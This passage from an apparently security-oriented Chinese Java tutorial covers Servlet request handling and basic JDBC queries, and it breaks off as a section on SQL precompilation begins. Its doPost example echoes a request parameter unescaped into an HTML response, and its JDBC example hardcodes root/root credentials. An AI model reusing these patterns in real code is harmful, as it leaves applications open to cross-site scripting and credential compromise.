</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;--------------destroy&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">destroy</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 处理GET和POST请求的服务方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">service</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;--------------http service&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">service</span><span class="p">(</span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">resp</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 覆盖的用于ServletRequest和ServletResponse的服务方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">service</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">res</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;--------------Servlet service&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">service</span><span class="p">(</span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">res</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>简单使用doPost</p>
<div class="code-block-container" id="code-1769750397272714700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397272714700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397272714700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397272714700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397272714700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doPost</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 从请求参数中获取名字数据</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 设置请求编码为UTF-8，以确保正确解析中文字符</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">req</span><span class="p">.</span><span class="na">setCharacterEncoding</span><span class="p">(</span><span class="s">&#34;UTF-8&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 设置响应内容类型为text/html</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">resp</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/html&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 获取PrintWriter对象，用于向客户端发送响应数据</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resp</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 向客户端发送提示信息，表示这是通过POST提交的数据</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;这是post提交的数据&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 向客户端发送从请求参数中获取的名字数据</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 在服务器端打印名字数据到控制台</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 刷新输出缓冲区，确保数据被及时发送到客户端</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 关闭PrintWriter，释放资源</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 在服务器端打印信息，表示doPost方法执行完成</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;--------------doPost&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="3servlet生命周期"><strong>3、Servlet生命周期</strong><a hidden class="anchor" aria-hidden="true" href="#3servlet生命周期">#</a></h4>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859477.png" style="max-width: 100%; height: auto;"></p>
<h4 id="4处理接受和回显"><strong>4、处理接受和回显</strong><a hidden class="anchor" aria-hidden="true" href="#4处理接受和回显">#</a></h4>
<ul>
<li>HttpServletRequest（HTTP请求的信息）</li>
<li>ServletRequest的子接口：<strong>HttpServletRequest是ServletRequest</strong>接口的子接口，提供了用于处理HTTP请求的额外功能。</li>
<li>getParameter(name)：通过参数名获取请求中的值。返回一个<strong>String</strong>，表示与给定参数名相对应的单个值。</li>
<li>getParameterValues(name)：通过参数名获取请求中的多个值。返回一个<strong>String[]</strong>，表示与给定参数名相对应的多个值。</li>
<li>HttpServletResponse（HTTP响应的信息）</li>
<li>ServletResponse的子接口：<strong>HttpServletResponse是ServletResponse</strong>接口的子接口，提供了用于处理HTTP响应的额外功能。</li>
<li>setCharacterEncoding()：设置响应的字符编码格式。通常用于确保正确的文本输出。</li>
<li>setContentType()：设置响应内容的类型和编码。常用于指定输出的数据类型，如HTML、JSON等。</li>
<li>getWriter()：获取一个<strong>PrintWriter</strong>字符输出流，用于向客户端发送文本数据。</li>
<li>PrintWriter：<strong>PrintWriter</strong>是用于向客户端输出字符数据的类，可以接受各种数据类型，然后将其转换为文本并发送到客户端。</li>
</ul>
<h2 id="数据库-jdbcmybatis库">数据库-JDBC&amp;Mybatis&amp;库<a hidden class="anchor" aria-hidden="true" href="#数据库-jdbcmybatis库">#</a></h2>
<p>-原生态数据库开发：JDBC<br>
参考：<a href="https://www.jianshu.com/p/ed1a59750127">https://www.jianshu.com/p/ed1a59750127</a><br>
JDBC(Java Database connectivity): 由java提供,用于访问数据库的统一API接口规范.数据库驱动: 由各个数据库厂商提供,用于访问数据库的jar包(JDBC的具体实现),遵循JDBC接口,以便java程序员使用！</p>
<h3 id="1下载jar">1、下载jar<a hidden class="anchor" aria-hidden="true" href="#1下载jar">#</a></h3>
<p><a href="https://mvnrepository.com/">https://mvnrepository.com/</a></p>
<h3 id="2引用封装jar">2、引用封装jar<a hidden class="anchor" aria-hidden="true" href="#2引用封装jar">#</a></h3>
<p>创建lib目录，复制导入后，添加为库</p>
<h3 id="3注册数据库驱动">3、注册数据库驱动<a hidden class="anchor" aria-hidden="true" href="#3注册数据库驱动">#</a></h3>
<p>“com.mysql.jdbc.Driver”： 这是 MySQL JDBC 驱动程序的类名。JDBC是 Java 用于与数据库交互的 API，而不同的数据库供应商提供了各自的 JDBC 驱动程序。在这里，&ldquo;com.mysql.jdbc.Driver&rdquo; 是 MySQL JDBC 驱动程序的类名。</p>
<p>加载和初始化： 当调用 Class.forName(&ldquo;com.mysql.jdbc.Driver&rdquo;); 时，它会尝试查找、加载并初始化指定的类。在这个过程中，MySQL JDBC 驱动程序的静态代码块（static {&hellip;}）会被执行，这通常用于注册驱动程序。</p>
<p>在旧版本的 MySQL 驱动中，com.mysql.jdbc.Driver 是驱动类的完整路径。<br>
在新版本中，com.mysql.cj.jdbc.Driver 是 MySQL Connector/J 的驱动类。</p>
<div class="code-block-container" id="code-1769750397277447200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397277447200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397277447200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397277447200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397277447200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.mysql.jdbc.Driver&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="4建立数据库连接">4、建立数据库连接<a hidden class="anchor" aria-hidden="true" href="#4建立数据库连接">#</a></h3>
<div class="code-block-container" id="code-1769750397278176800" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397278176800">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397278176800" title="Toggle" aria-expanded="false" aria-controls="code-1769750397278176800" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397278176800-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 定义数据库连接的URL，格式为：jdbc:mysql://host:port/database</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;jdbc:mysql://localhost:3306/dome01&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">// 使用DriverManager获取数据库连接</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;root&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;root&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">// 打印数据库连接信息</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">connection</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="5创建statement执行sql">5、创建Statement执行SQL<a hidden class="anchor" aria-hidden="true" href="#5创建statement执行sql">#</a></h3>
<p>connection.createStatement();： 在Connection对象上调用createStatement方法，创建一个Statement对象。Statement对象用于执行SQL语句，它可以执行静态的SQL查询、更新、删除等操作。createStatement方法返回一个新的Statement对象。<br>
创建一个Statement对象，然后使用该对象执行给定的SQL查询语句，将查询结果存储在一个ResultSet对象中。这样，您可以通过遍历ResultSet来检索和处理查询的结果集中的数据。</p>
<div class="code-block-container" id="code-1769750397278682700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397278682700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397278682700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397278682700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397278682700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 创建Statement对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">Statement</span><span class="w"> </span><span class="n">statement</span><span class="o">=</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="na">createStatement</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">sql</span><span class="o">=</span><span class="s">&#34;select * from news&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">// 执行查询，获取结果集</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">ResultSet</span><span class="w"> </span><span class="n">resultSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">(</span><span class="n">sql</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="6结果resultset进行提取">6、结果ResultSet进行提取<a hidden class="anchor" aria-hidden="true" href="#6结果resultset进行提取">#</a></h3>
<div class="code-block-container" id="code-1769750397279735300" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397279735300">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397279735300" title="Toggle" aria-expanded="false" aria-controls="code-1769750397279735300" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397279735300-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 遍历结果集</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">resultSet</span><span class="p">.</span><span class="na">next</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 从结果集中获取每一行的数据</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 获取整型列 &#34;id&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resultSet</span><span class="p">.</span><span class="na">getInt</span><span class="p">(</span><span class="s">&#34;id&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 获取字符串列 &#34;page_title&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">page_title</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resultSet</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;page_title&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">heading</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resultSet</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;heading&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">subheading</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resultSet</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;subheading&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resultSet</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;content&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">img</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resultSet</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;img&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 输出每一行的数据，以便查看结果</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">id</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;|&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">page_title</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;|&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">heading</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;|&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">subheading</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;|&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;|&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">img</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h1 id="33-sql预编译filter过滤器listener监听器">33-SQL预编译&amp;Filter过滤器&amp;Listener监听器<a hidden class="anchor" aria-hidden="true" href="#33-sql预编译filter过滤器listener监听器">#</a></h1>
<h2 id="预编译-sql原理">预编译-SQL原理：<a hidden class="anchor" aria-hidden="true" href="#预编译-sql原理">#</a></h2>
<p>原理：<strong>提前编译好执行逻辑，你注入的语句不会改变原有逻辑！</strong></p>
<div class="code-block-container" id="code-1769750397281497000" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397281497000">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
